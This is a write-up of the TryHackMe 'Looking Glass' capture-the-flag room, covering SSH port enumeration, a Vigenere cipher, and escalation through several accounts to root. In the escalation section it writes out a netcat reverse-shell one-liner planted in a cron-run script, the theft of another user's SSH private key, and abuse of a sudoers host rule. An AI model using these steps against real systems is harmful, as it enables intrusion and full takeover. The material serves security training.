# Looking Glass

Looking Glass is a CTF that teaches you about enumerating SSH, decrypting ciphertext, adding malicious code into a script and misconfigured permissions.

## Information:

**Name:** Looking Glass  
**Difficulty:** Medium  
**Released:** Sun 16 August 2020  
**Creator:** NinjaJc01  
**URL:** https://tryhackme.com/room/lookingglass  

## Enumeration

Start off with an nmap scan which goes like this:

```vim
nmap -Pn -sV -sC -v <IP_ADDR>
```

You will see a lot of ports open showing this as a response `Dropbear sshd (protocol 2.0)`. Specifically, there are ports open from 9000-13999 and then ones which show as something else are `Dropbear sshd` ports which nmap couldn't figure out. I looked for any available vulnerabilities but there wasn't anything interesting. So we try connecting to a port with the following command:

```vim
ssh <IP_ADDR> -p 9000 -oHostKeyAlgorithms=ssh-rsa 
```
  
Response:
```vim
The authenticity of host '[10.10.207.144]:9000 ([10.10.207.144]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.207.144]:9000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.207.144 closed.
```
This gives us `Lower` as a response (If you go for 13999 as the port instead it could come as `Higher`). The thing that is happening here is that The response is the inverse of what it is, in the sense that `Lower` meant to go higher and vice-versa and we have to find the correct port.

Note: The real port changes with every reboot of the machine, so you have to go looking for the correct port each time.

The methodology that I used was to pick the middle number between 2 numbers each time, Ex. If you picked the numbers between 10000 (shows `Higher`) - 9000 (shows `Lower`), I would pick 9500 and see the response and repeat till I find the right number(Similar to block sort algorithm).

### Decoding Ciphers

Once you find the correct port, you will get the following as a response:

```md
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

This looks like some form of cipher text. To decipher this, You can use the following website: https://www.boxentriq.com/code-breaking/cipher-identifier.

One of the possible cipher's was the Vigenere Cipher(https://www.boxentriq.com/code-breaking/vigenere-cipher). Enter the ciphertext and increase the max key length from 10 to 20 and click `Auto Solve`. 

The first response will be the key to the cipher text. Now, add the key and decode it again to get the full cleartext. At the very end of the cleartext, you will see the secret that you need to enter.

### Foothold

Entering the Secret gives you the SSH credentials to log into the jabberwock account.
Note: The password of the jabberwock account will change each time the machine reboots, so you will have to enter the secret again once you find the correct port.

With this, you have can now run the following command to get foothold on the target machine:

```vim
ssh jabberwock@<IP_ADDR>
```

To see the user flag, run `cat user.txt` and reverse the text.

## PrivEsc

Run `ls -la /home`. There are more than 1 account which implies that we will probably have to hop between accounts before we get access to root.

### Jabberwock to Tweedledum

Run `ls` and we will see that there are 2 more files other than user.txt, specifically poem.txt and twasBrillig.sh. twasBrillig.sh has the following code in it:

```vim
wall $(cat /home/jabberwock/poem.txt)
```

Run `sudo -l` and enter your password. You will get the following response:

```vim
User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

This means that jabberwock can run `reboot` as `sudo`.

Check `/etc/crontab` and you will see the following line of code which is of great interest:

```vim
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

What the above line of code means is that there is a crontab which runs every time on reboot, where it runs twasBrillig.sh as the user tweedledum.

This brings the idea of having a reverse shell code on twasBrillig.sh and reboot to give us access to the tweedledum account.

Run `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_ADDR> <PORT> >/tmp/f' > twasBrillig.sh`. Replace <IP_ADDR> and <PORT> with your tun0 IP and the port on which your `netcat` listener will be set up. Run `nc -lvnp <PORT>` on your attacking machine. Lastly, run `sudo reboot` and then you will get the reverse shell for tweedledum.

### Tweedledum to HumptyDumpty

run `ls` and you will see 2 files, `humptydumpty.txt` and `poem.txt`. `poem.txt` is useless, and `humptydumpty.txt` has the following text:

```
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9 (SHA256)
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed (SHA256)
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624 (SHA256)
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f (SHA256)
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6 (SHA256)
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0 (SHA256)
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 (SHA256)
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b (HEX)
```

Everything except the last one is a sha256 hash and the last one is a hex encoded text which can be decoded by CyberChef (https://gchq.github.io/CyberChef/). The last one has the password which can be used to access the humptydumpty account.

You cannot SSH into the humptydumpty account, so you can either do `su humptydumpty` in the reverse shell or get access to jabberwock account again and do `su humptydumpty` there.

### HumptyDumpty to Alice

Here, you have to check the `/home` directory and see the following:

```vim
total 24
4 drwx--x--x 6 alice        alice        4096 Jul  3  2020 alice
4 drwx------ 2 humptydumpty humptydumpty 4096 Jul  3  2020 humptydumpty
4 drwxrwxrwx 5 jabberwock   jabberwock   4096 Jul  3  2020 jabberwock
4 drwx------ 5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
4 drwx------ 3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
4 drwx------ 2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

The alice home directory has execute permission enabled, which means that you can execute commands there. I run the following command:

```vim
cat /home/alice/.ssh/id_rsa
```

Copy the `id_rsa` onto your machine and run `chmod 600 id_rsa` to be able to run the private key in the SSH command. To log in as alice, run the command:

```vim
ssh alice@<IP_ADDR> -i id_rsa
```

### Alice to Root

Here, you can run linPEAS or just check the `/etc/sudoers.d` file where the `alice` file is readable and has the following:
  
```vim
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

This means that alice can run `bash` as root on hostname `ssalg-gnikool`. You can get access to root with the following command:

```vim
sudo -h ssalg-gnikool /bin/bash
```

Run `cat /root/root.txt` and reverse the text to get the root flag.
